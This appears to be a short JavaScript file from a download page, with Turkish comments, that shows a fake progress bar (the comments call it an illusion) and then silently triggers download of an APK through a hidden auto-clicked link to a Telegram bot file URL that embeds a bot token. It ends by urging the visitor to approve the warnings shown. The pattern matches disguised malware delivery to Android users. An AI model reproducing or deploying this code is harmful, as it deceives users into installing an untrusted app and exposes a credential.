document.getElementById('start-btn').addEventListener('click', function() {
    const bar = document.getElementById('bar');
    const status = document.getElementById('status');
    
    // İllüzyon: Bar dolarken dosya aslında inmiyor, sadece süs
    let width = 0;
    const interval = setInterval(() => {
        width += 2;
        bar.style.width = width + "%";
        status.innerText = "İndiriliyor... %" + width;

        if (width >= 100) {
            clearInterval(interval);
            
            // ASIL TETİKLEME BURADA:
            const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
            
            // Görünmez bir link oluşturup tıkla
            const a = document.createElement('a');
            a.href = apkUrl;
            // Target _self kullanarak aynı sayfada kalmasını sağla
            a.target = "_self"; 
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            status.innerHTML = "<b>Dosya Hazır!</b><br>Lütfen alttaki uyarılara onay verin.";
        }
    }, 50); // Hızlandırılmış bar
});
